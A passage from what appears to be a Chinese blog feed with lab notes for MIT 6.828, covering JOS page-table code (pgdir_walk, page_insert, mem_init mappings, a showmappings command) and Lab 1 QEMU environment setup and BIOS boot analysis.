        pt_addr_v <span class="token operator">=</span> <span class="token punctuation">(</span>pte_t <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">KADDR</span><span class="token punctuation">(</span><span class="token function">PTE_ADDR</span><span class="token punctuation">(</span><span class="token operator">*</span>pt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> pt_addr_v <span class="token operator">+</span> <span class="token function">PTX</span><span class="token punctuation">(</span>va<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">struct</span> PageInfo <span class="token operator">*</span>newpt<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>create <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>newpt <span class="token operator">=</span> <span class="token function">page_alloc</span><span class="token punctuation">(</span>ALLOC_ZERO<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">memset</span><span class="token punctuation">(</span><span class="token function">page2kva</span><span class="token punctuation">(</span>newpt<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> PGSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
            newpt<span class="token operator">-></span>pp_ref <span class="token operator">++</span><span class="token punctuation">;</span>
            <span class="token operator">*</span>pt <span class="token operator">=</span> <span class="token function">PADDR</span><span class="token punctuation">(</span><span class="token function">page2kva</span><span class="token punctuation">(</span>newpt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">|</span>PTE_U<span class="token operator">|</span>PTE_W<span class="token operator">|</span>PTE_P<span class="token punctuation">;</span>
            pt_addr_v <span class="token operator">=</span> <span class="token punctuation">(</span>pte_t <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">KADDR</span><span class="token punctuation">(</span><span class="token function">PTE_ADDR</span><span class="token punctuation">(</span><span class="token operator">*</span>pt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> pt_addr_v <span class="token operator">+</span> <span class="token function">PTX</span><span class="token punctuation">(</span>va<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>接着是boot_map_region函数，这个函数将虚拟地址[va, va+size)映射到物理地址[pa, pa+size)，注释中提到可以使用上面写的pgdir_walk，获取页表地址，接着将物理地址的值与上权限位赋给页表地址。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span>
<span class="token function">boot_map_region</span><span class="token punctuation">(</span>pde_t <span class="token operator">*</span>pgdir<span class="token punctuation">,</span> uintptr_t va<span class="token punctuation">,</span> size_t size<span class="token punctuation">,</span> physaddr_t pa<span class="token punctuation">,</span> <span class="token keyword">int</span> perm<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// Fill this function in</span>
    <span class="token keyword">int</span> offset<span class="token punctuation">;</span>
    pte_t <span class="token operator">*</span>pt<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> offset <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> offset <span class="token operator">+</span><span class="token operator">=</span> PGSIZE<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        pt <span class="token operator">=</span> <span class="token function">pgdir_walk</span><span class="token punctuation">(</span>pgdir<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>va<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">*</span>pt <span class="token operator">=</span> pa<span class="token operator">|</span>perm<span class="token operator">|</span>PTE_P<span class="token punctuation">;</span>
        pa <span class="token operator">+</span><span class="token operator">=</span> PGSIZE<span class="token punctuation">;</span>
        va <span class="token operator">+</span><span class="token operator">=</span> PGSIZE<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>之后是page_lookup函数，查找线性地址va对应的物理页面，找到就返回这个物理页，否则返回NULL。首先如果pte_store非0，则储存这个页的页表地址，这一步是为了之后的page_remove用的。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> PageInfo <span class="token operator">*</span>
<span class="token function">page_lookup</span><span class="token punctuation">(</span>pde_t <span class="token operator">*</span>pgdir<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>va<span class="token punctuation">,</span> pte_t <span class="token operator">*</span><span class="token operator">*</span>pte_store<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// Fill this function in</span>
    pte_t <span class="token operator">*</span>pte <span class="token operator">=</span> <span class="token function">pgdir_walk</span><span class="token punctuation">(</span>pgdir<span class="token punctuation">,</span> va<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>pte_store <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token operator">*</span>pte_store <span class="token operator">=</span> pte<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>pte <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token operator">*</span>pte <span class="token operator">&amp;</span> PTE_P<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">pa2page</span><span class="token punctuation">(</span><span class="token function">PTE_ADDR</span><span class="token punctuation">(</span><span class="token operator">*</span>pte<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>page_remove函数算是比较容易的，参考注释里的提示，先通过page_lookup获得物理页，如果存在则执行删除工作page_decref，同时也要将va地址的页表项设为0，最后就是验证有效性。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span>
<span class="token function">page_remove</span><span class="token punctuation">(</span>pde_t <span class="token operator">*</span>pgdir<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>va<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// Fill this function in</span>
    pte_t <span class="token operator">*</span>pte<span class="token punctuation">;</span>
    <span class="token keyword">struct</span> PageInfo <span class="token operator">*</span>page <span class="token operator">=</span> <span class="token function">page_lookup</span><span class="token punctuation">(</span>pgdir<span class="token punctuation">,</span> va<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pte<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>page<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">page_decref</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">*</span>pte <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token function">tlb_invalidate</span><span class="token punctuation">(</span>pgdir<span class="token punctuation">,</span> va<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>最后一步就是page_insert函数，将页面管理结构 pp 所对应的物理页面分配给线性地址 va。同时,将对应的页表项的 permission 设置成 PTE_P&amp;perm。 注意:一定要考虑到线性地址 va 已经指向了另外一个物理页面或者干脆就是这个函数要指向的物理页面的情况。如果线性地址 va 已经指向了另外一个物理页面,则先要调用 page_remove 将该物理页从线性地址 va 处删除,再将 va 对应的页表项的地址赋值为 pp 对应 的物理页面。如果 va 指向的本来就是参数 pp 所对应的物理页面,则将 va 对应的页表项中 的物理地址赋值重新赋值为 pp 所对应的物理页面的首地址即可。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span>
<span class="token function">page_insert</span><span class="token punctuation">(</span>pde_t <span class="token operator">*</span>pgdir<span class="token punctuation">,</span> <span class="token keyword">struct</span> PageInfo <span class="token operator">*</span>pp<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>va<span class="token punctuation">,</span> <span class="token keyword">int</span> perm<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// Fill this function in</span>
    pte_t <span class="token operator">*</span>pte <span class="token operator">=</span> <span class="token function">pgdir_walk</span><span class="token punctuation">(</span>pgdir<span class="token punctuation">,</span> va<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pte<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token operator">-</span>E_NO_MEM<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>  
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>pte <span class="token operator">&amp;</span> PTE_P<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">PTE_ADDR</span><span class="token punctuation">(</span><span class="token operator">*</span>pte<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">page2pa</span><span class="token punctuation">(</span>pp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">tlb_invalidate</span><span class="token punctuation">(</span>pgdir<span class="token punctuation">,</span> va<span class="token punctuation">)</span><span class="token punctuation">;</span>
            pp<span class="token operator">-></span>pp_ref<span class="token operator">--</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token function">page_remove</span><span class="token punctuation">(</span>pgdir<span class="token punctuation">,</span> va<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token operator">*</span>pte <span class="token operator">=</span> <span class="token function">page2pa</span><span class="token punctuation">(</span>pp<span class="token punctuation">)</span> <span class="token operator">|</span> perm <span class="token operator">|</span> PTE_P<span class="token punctuation">;</span>
    pp<span class="token operator">-></span>pp_ref<span class="token operator">++</span><span class="token punctuation">;</span>
    pgdir<span class="token punctuation">[</span><span class="token function">PDX</span><span class="token punctuation">(</span>va<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">|</span><span class="token operator">=</span> perm<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h2 id="Part_3_3A__u5185_u6838_u5730_u5740_u7A7A_u95F4"><a href="#Part_3_3A__u5185_u6838_u5730_u5740_u7A7A_u95F4" class="headerlink" title="Part 3: 内核地址空间"></a>Part 3: 内核地址空间</h2><h3 id="u7EBF_u6027_u5730_u5740_u7684_u4E24_u90E8_u5206"><a href="#u7EBF_u6027_u5730_u5740_u7684_u4E24_u90E8_u5206" class="headerlink" title="线性地址的两部分"></a>线性地址的两部分</h3><p>JOS将处理器32位线性地址划分为占低地址的用户环境(进程)和占高地址的内核。 分界线是<code>inc/memlayout.h</code>中的变量 ULIM。内核保留了大约256MB的虚拟地址空间，lab1中内核设在那么高的地址就是因为要留一部分空间给用户环境。</p>
<h3 id="u8BBF_u95EE_u6743_u9650_u548C_u6545_u969C_u9694_u79BB"><a href="#u8BBF_u95EE_u6743_u9650_u548C_u6545_u969C_u9694_u79BB" class="headerlink" title="访问权限和故障隔离"></a>访问权限和故障隔离</h3><p>内核和用户内存都在各自的环境地址空间中，必须在x86页表中使用访问权限位(Permissions bits)来使用户代码只访问用户的地址空间，否则用户的代码bug会覆盖内核数据，造成系统崩溃。值得注意的是可写权限位(PTE_W)可以同时影响用户和内核代码。 </p>
<p>高于ULIM的内存内核可以读写，而用户环境没有权限。内核和用户在地址[UTOP,ULIM)有同样的权限：可读但不可写，这部分地址空间通常是一些特定的内核数据，让用户环境可以读取。最后，地址UTOP之下的是用户环境。</p>
<h3 id="u521D_u59CB_u5316_u5185_u6838_u5730_u5740_u7A7A_u95F4"><a href="#u521D_u59CB_u5316_u5185_u6838_u5730_u5740_u7A7A_u95F4" class="headerlink" title="初始化内核地址空间"></a>初始化内核地址空间</h3><p>设置UTOP之上的地址空间。在<code>inc/memlayout.h</code>中显示了布局。</p>
<h4 id="Exercise_5"><a href="#Exercise_5" class="headerlink" title="Exercise 5"></a>Exercise 5</h4><p>完成mem_init()中缺少的部分。</p>
<p>因为mem_init开头创建了初始化页目录kern_pgdir，首先是将pages数组映射到线性地址UPAGES，权限是内核只读。</p>
<pre class=" language-c"><code class="language-c"><span class="token function">boot_map_region</span><span class="token punctuation">(</span>kern_pgdir<span class="token punctuation">,</span> UPAGES<span class="token punctuation">,</span> PTSIZE<span class="token punctuation">,</span> <span class="token function">PADDR</span><span class="token punctuation">(</span>pages<span class="token punctuation">)</span><span class="token punctuation">,</span>PTE_U<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>接着是映射物理地址到内核栈，也就是从地址范围[KSTACKTOP-KSTKSIZE, KSTACKTOP)映射到bootstack开始的物理地址页上，注释中提到了，只要映射[KSTACKTOP-KSTKSIZE, KSTACKTOP)， [KSTACKTOP-PTSIZE, KSTACKTOP-KSTKSIZE)不映射，权限位是内核读写。</p>
<pre class=" language-c"><code class="language-c"><span class="token function">boot_map_region</span><span class="token punctuation">(</span>kern_pgdir<span class="token punctuation">,</span> KSTACKTOP<span class="token operator">-</span>KSTKSIZE<span class="token punctuation">,</span> KSTKSIZE<span class="token punctuation">,</span> <span class="token function">PADDR</span><span class="token punctuation">(</span>bootstack<span class="token punctuation">)</span><span class="token punctuation">,</span> PTE_W<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>最后是映射虚拟地址[KERNBASE, 2^32)到物理地址[0, 2^32 - KERNBASE)，权限位是内核读写。</p>
<pre class=" language-c"><code class="language-c"><span class="token function">boot_map_region</span><span class="token punctuation">(</span>kern_pgdir<span class="token punctuation">,</span> KERNBASE<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0xffffffff</span><span class="token operator">-</span>KERNBASE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> PTE_W<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>这时候运行<code>grade-lab2</code>应该是拿到了全部分数。</p>
<p><img src="4.png" alt=""></p>
<h4 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h4><p>2.填写这个页目录，可以参考<code>inc/memlayout.h</code></p>
<pre><code>| Entry | Base Virtual Address |  Points to (logically):  |
| ----- | -----:   | :----: |
|  1023 | 0xffc00000  |   Page table for top 4MB of phys memory   |
|  1022 | 0xff800000  |   .    |
|   .   |      .      |   .    |
|  960  | 0xf0000000  |   KERNBASE |
|   .   |      .      |   .    |
|   2   | 0x00800000  |   Program Data &amp; Heap     |
|   1   | 0x00400000  |   Empty Memory (*)    |
|   0   | 0x00000000  |   Empty Memory    | 
</code></pre><p>3.为什么用户不能改内核代码？因为没有权限。</p>
<p>其他问题有点不确定思路，先放着吧。</p>
<h4 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h4><p>添加一个显示页映射的功能。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">mon_showmappings</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">struct</span> Trapframe <span class="token operator">*</span>tf<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">extern</span> pte_t <span class="token operator">*</span><span class="token function">pgdir_walk</span><span class="token punctuation">(</span>pde_t <span class="token operator">*</span>pgdir<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>va<span class="token punctuation">,</span> <span class="token keyword">int</span> create<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">extern</span> pde_t <span class="token operator">*</span>kern_pgdir<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"Usage: showmappings 0xbegin_addr 0xend_addr\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">long</span> begin <span class="token operator">=</span> <span class="token function">strtol</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">long</span> end <span class="token operator">=</span> <span class="token function">strtol</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>end <span class="token operator">&lt;=</span> begin<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"end_addr must larger than begin_addr\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>end <span class="token operator">></span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"end_addr overflow\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>begin <span class="token operator">!=</span> <span class="token function">ROUNDUP</span><span class="token punctuation">(</span>begin<span class="token punctuation">,</span> PGSIZE<span class="token punctuation">)</span> <span class="token operator">||</span> end <span class="token operator">!=</span> <span class="token function">ROUNDUP</span><span class="token punctuation">(</span>end<span class="token punctuation">,</span> PGSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"not aligned\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> begin <span class="token operator">&lt;</span> end<span class="token punctuation">;</span> begin<span class="token operator">+</span><span class="token operator">=</span>PGSIZE<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"%08x--%08x: "</span><span class="token punctuation">,</span> begin<span class="token punctuation">,</span> begin<span class="token operator">+</span>PGSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
        pte_t <span class="token operator">*</span>pte <span class="token operator">=</span> <span class="token function">pgdir_walk</span><span class="token punctuation">(</span>kern_pgdir<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>begin<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pte<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"not mapped\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"page %08x "</span><span class="token punctuation">,</span> <span class="token function">PTE_ADDR</span><span class="token punctuation">(</span><span class="token operator">*</span>pte<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"PTE_P: %x, PTE_W: %x, PTE_U: %x\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span>pte<span class="token operator">&amp;</span>PTE_P<span class="token punctuation">,</span> <span class="token operator">*</span>pte<span class="token operator">&amp;</span>PTE_W<span class="token punctuation">,</span> <span class="token operator">*</span>pte<span class="token operator">&amp;</span>PTE_U<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h3 id="u5730_u5740_u7A7A_u95F4_u5E03_u5C40"><a href="#u5730_u5740_u7A7A_u95F4_u5E03_u5C40" class="headerlink" title="地址空间布局"></a>地址空间布局</h3><p>地址空间布局可以有多种，x86的模式是为了向后兼容。</p>
<h2 id="u603B_u7ED3"><a href="#u603B_u7ED3" class="headerlink" title="总结"></a>总结</h2><p>这个lab更多的是动手写代码，分页机制在计算机组成原理曾经讲过一部分，然而如今已经忘了，做这个lab还要配合CSAPP，总之通过看了很多文章，终于依葫芦画瓢的把这个lab给结束掉了。</p>
<h2 id="u53C2_u8003_u8D44_u6599"><a href="#u53C2_u8003_u8D44_u6599" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://www.cnblogs.com/fatsheep9146/category/769143.html" target="_blank" rel="external">MIT 6.828 JOS 操作系统学习笔记</a></p>
<p><a href="http://grid.hust.edu.cn/zyshao/Teaching_Material/OSEngineering/Chapter4.pdf" target="_blank" rel="external">第四章.内存管理(lab2)(v0.1)</a></p>
<p><a href="https://github.com/Clann24/jos/tree/master/lab2" target="_blank" rel="external">Clann24/jos</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[MIT 6.828 Lab 1]]></title>
      <url>http://xinqiu.me/2016/10/15/MIT-6.828-1/</url>
      <content type="html"><![CDATA[<p>MIT 6.828 算是操作系统的经典课程，其中要求完成一个JOS的操作系统。在这之前，需要完成一些环境的安装。</p>
<a id="more"></a>
<h2 id="u524D_u671F_u51C6_u5907"><a href="#u524D_u671F_u51C6_u5907" class="headerlink" title="前期准备"></a>前期准备</h2><p>我的系统是Ubuntu 14.04 64位，在虚拟机中运行的。在Lab 1中提到了安装实验的方法。考虑到国内的网络情况，建议使用ss配合proxychains在终端中使用</p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> clone https://pdos.csail.mit.edu/6.828/2016/jos.git lab
</code></pre>
<p>如果直接make可能会出现<code>undefined reference to &#39;__udivdi3&#39;</code>的问题，解决方案：</p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> gcc-multilib
</code></pre>
<p>如果没装qemu，这里需要安装qemu，在课程的Tools页面中，提到了QEMU最好安装修改版，考虑到<code>git clone http://web.mit.edu/ccutler/www/qemu.git -b 6.828-2.3.0</code>这个不好clone，建议使用</p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/geofft/qemu.git -b 6.828-2.3.0
</code></pre>
<p>在执行 <code>./configure --disable-kvm [--prefix=PFX] [--target-list=&quot;i386-softmmu x86_64-softmmu&quot;]</code> （PFX为安装路径，可以省略）<br>时，可能会出现几种情况：</p>
<ol>
<li>ERROR: zlib check failed<pre><code>Make sure to have the zlib libs and headers installed.
</code></pre></li>
</ol>
<p>解决: <code>sudo apt-get install zlib1g-dev</code></p>
<ol>
<li>ERROR: glib-2.12 gthread-2.0 is required to compile QEMU</li>
</ol>
<p>解决: <code>sudo apt-get install libglib2.0-dev</code></p>
<ol>
<li>ERROR: pixman &gt;= 0.21.8 not present. Your options:<pre><code>  (1) Preferred: Install the pixman devel package (any recent
      distro should have packages as Xorg needs pixman too).
  (2) Fetch the pixman submodule, using:
      git submodule update --init pixman
</code></pre></li>
</ol>
<p>解决: <code>sudo apt-get install libpixman-1-dev</code></p>
<p>还有一个找了很久解决方案的错误:</p>
<pre class=" language-bash"><code class="language-bash">vl.c: In <span class="token keyword">function</span> ‘main’:
vl.c:2778:5: error: ‘g_mem_set_vtable’ is deprecated <span class="token punctuation">[</span>-Werror<span class="token operator">=</span>deprecated-declarations<span class="token punctuation">]</span>
     g_mem_set_vtable<span class="token punctuation">(</span><span class="token operator">&amp;</span>mem_trace<span class="token punctuation">)</span><span class="token punctuation">;</span>
     ^
In <span class="token function">file</span> included from /usr/include/glib-2.0/glib/glist.h:32:0,
                 from /usr/include/glib-2.0/glib/ghash.h:33,
                 from /usr/include/glib-2.0/glib.h:50,
                 from vl.c:59:
/usr/include/glib-2.0/glib/gmem.h:357:7: note: declared here
 void  g_mem_set_vtable <span class="token punctuation">(</span>GMemVTable *vtable<span class="token punctuation">)</span><span class="token punctuation">;</span>
       ^
cc1: all warnings being treated as errors
rules.mak:57: recipe <span class="token keyword">for</span> target <span class="token string">'vl.o'</span> failed
make: *** <span class="token punctuation">[</span>vl.o<span class="token punctuation">]</span> Error 1
</code></pre>
<p>其实解决起来很简单，在Makefile文件最后加上一行 <code>QEMU_CFLAGS+=-w</code> 就可以了。 </p>
<p>之后运行 <code>make &amp;&amp; make install</code> ,这里可能会出现一个权限不够的坑，建议先提权 <code>sudo -s</code>。<br>至此，<code>make</code>会出现：</p>
<p><img src="1.png" alt=""></p>
<p>生成了一个 <code>kernel.img</code> 的镜像，执行 <code>make qemu</code> 就会用 qemu 去运行这个镜像</p>
<p><img src="2.png" alt=""></p>
<p>倒是我这里没看到’Booting from Hard Disk…’，另外前面还有一堆信息。输入 <code>help</code> 和 <code>kerninfo</code> 都有正常信息出现，所以应该环境什么应该算是搭建好了。</p>
<h2 id="Part_1_3A_PC_Bootstrap"><a href="#Part_1_3A_PC_Bootstrap" class="headerlink" title="Part 1: PC Bootstrap"></a>Part 1: PC Bootstrap</h2><h3 id="PC_u7269_u7406_u5730_u5740_u7A7A_u95F4"><a href="#PC_u7269_u7406_u5730_u5740_u7A7A_u95F4" class="headerlink" title="PC物理地址空间"></a>PC物理地址空间</h3><pre><code>+------------------+  &lt;- 0xFFFFFFFF (4GB)
|      32-bit      |
|  memory mapped   |
|     devices      |
|                  |
/\/\/\/\/\/\/\/\/\/\

/\/\/\/\/\/\/\/\/\/\
|                  |
|      Unused      |
|                  |
+------------------+  &lt;- depends on amount of RAM
|                  |
|                  |
| Extended Memory  |
|                  |
|                  |
+------------------+  &lt;- 0x00100000 (1MB)
|     BIOS ROM     |
+------------------+  &lt;- 0x000F0000 (960KB)
|  16-bit devices, |
|  expansion ROMs  |
+------------------+  &lt;- 0x000C0000 (768KB)
|   VGA Display    |
+------------------+  &lt;- 0x000A0000 (640KB)
|                  |
|    Low Memory    |
|                  |
+------------------+  &lt;- 0x00000000
</code></pre><p>早期基于16位Intel 8088处理器只能操作1MB物理内存，因此物理地址空间起始于0x00000000到0x000FFFFF，其中640KB为 Low memory，这只能被随机存储器(RAM)使用。</p>
<p>从 0x000A0000 到 0x000FFFFF 的384KB留着给特殊使用，例如作为视频显示缓存或者储存在非易失存储器的硬件。从 0x000F0000 到 0x000FFFFF 占据64KB区域的部分是最重要的BIOS。BIOS的功能这里就不细说了。</p>
<p>现在的x86处理器支持超过4GB的物理RAM，所以RAM扩展到了0xFFFFFFFF。当然，BIOS也流出了开始的32位寻址空间为了让32位的设备映射。JOS这里只用开始的256MB，所以假设PC只有32位地址空间。</p>
<h3 id="BIOS"><a href="#BIOS" class="headerlink" title="BIOS"></a>BIOS</h3><p>在一个终端中输入 <code>make qemu-gdb</code> ， 另一个终端输入 <code>make gdb</code> 。开始调试程序。</p>
<p><code>[f000:fff0] 0xffff0:    ljmp   $0xf000,$0xe05b</code></p>
<p>是GDB反汇编出的第一条执行指令，这条指令表面了：</p>
<ul>
<li>IBM PC 执行的起始物理地址为 0x000ffff0</li>
<li>PC 的偏移方式为 CS = 0xf000，IP = 0xfff0</li>
<li>第一条指令执行的是 jmp指令，跳转到段地址  CS = 0xf000，IP = 0xe05b</li>
</ul>
<p>QEMU模拟了8088处理器的启动，当启动电源，BIOS最先控制机器，这时还没有其他程序执行，之后处理器进入实模式也就是设置 CS 为 0xf000，IP 为 0xfff0。在启动电源也就是实模式时，地址转译根据这个公式工作：物理地址 = 16 * 段地址 + 偏移量。所以 PC 中 CS 为 0xf000 IP 为 0xfff0 的物理地址为：</p>
<pre><code>   16 * 0xf000 + 0xfff0   # 十六进制中乘16很容易
   = 0xf0000 + 0xfff0     # 仅仅添加一个0.
   = 0xffff0
</code></pre><p>0xffff0 在 BIOS (0x100000) 的结束地址之前。</p>
